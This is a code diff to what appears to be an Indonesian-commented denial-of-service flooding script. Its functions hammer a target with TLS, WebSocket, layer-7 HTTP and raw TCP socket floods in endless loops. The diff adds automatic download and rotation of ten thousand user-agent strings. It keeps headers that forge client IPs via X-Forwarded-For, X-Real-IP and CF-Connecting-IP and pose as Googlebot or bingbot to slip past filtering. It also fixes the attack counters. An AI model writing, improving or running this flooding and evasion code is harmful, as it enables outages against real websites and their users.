@@ -27,6 +27,29 @@ target_status = "🟢 OKE"
 spoof_mode = False
 lock = Lock()
 
+# 💣 USER AGENT LOADER OTOMATIS
+USER_AGENTS = []
+ua_file = "10k-user-agent.txt"
+
+if not os.path.exists(ua_file):
+    print("📥 File User-Agent belum ada, download otomatis...")
+    try:
+        import urllib.request
+        urllib.request.urlretrieve(
+            "https://raw.githubusercontent.com/Rizz9/10k-user-agent/main/10k-user-agent.txt", ua_file
+        )
+        print("✅ Berhasil download 10k-user-agent.txt")
+    except Exception as e:
+        print(f"❌ Gagal download user-agent: {e}")
+        USER_AGENTS = []
+
+if os.path.exists(ua_file):
+    with open(ua_file, "r") as f:
+        USER_AGENTS = [ua.strip() for ua in f if ua.strip()]
+    print(f"✅ Loaded {len(USER_AGENTS)} User-Agent")
+else:
+    print("⚠️ File 10k-user-agent.txt tidak ditemukan, pakai User-Agent default.")
+
 # === UTILITAS ===
 def kotak(text):
     lines = text.strip().split("\n")
@@ -44,19 +67,21 @@ def gen_data():
     return base + padding
 
 def normal_headers():
+    ua = random.choice(USER_AGENTS) if USER_AGENTS else "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/119"
     return {
-        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/119",
+        "User-Agent": ua,
         "Accept": "*/*",
         "Connection": "keep-alive"
     }
 
 def spoofed_headers():
     ip = ".".join(str(random.randint(1, 255)) for _ in range(4))
+    ua = random.choice(USER_AGENTS) if USER_AGENTS else random.choice([
+        "Googlebot/2.1 (+http://www.google.com/bot.html)",
+        "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
+    ])
     return {
-        "User-Agent": random.choice([
-            "Googlebot/2.1 (+http://www.google.com/bot.html)",
-            "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
-        ]),
+        "User-Agent": ua,
         "X-Forwarded-For": ip,
         "X-Real-IP": ip,
         "CF-Connecting-IP": ip,
@@ -116,18 +141,17 @@ def attack_tls_client():
                 total_req += 1
 
 def attack_ws():
+    global sukses, gagal, total_req
     try:
         ws = create_connection(TARGET_URL.replace("http", "ws"), timeout=5)
         while True:
             try:
                 ws.send(gen_data())
                 with lock:
-                    global sukses, total_req
                     sukses += 1
                     total_req += 1
             except:
                 with lock:
-                    global gagal, total_req
                     gagal += 1
                     total_req += 1
                 break
@@ -156,6 +180,7 @@ def attack_l7_dual():
                 total_req += 1
 
 def attack_socket_raw():
+    global l4_sent, total_req
     while True:
         try:
             s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -163,7 +188,6 @@ def attack_socket_raw():
             s.connect((TARGET_IP, TARGET_PORT))
             s.sendall(gen_data().encode())
             with lock:
-                global l4_sent, total_req
                 l4_sent += 1024
                 total_req += 1
             s.close()
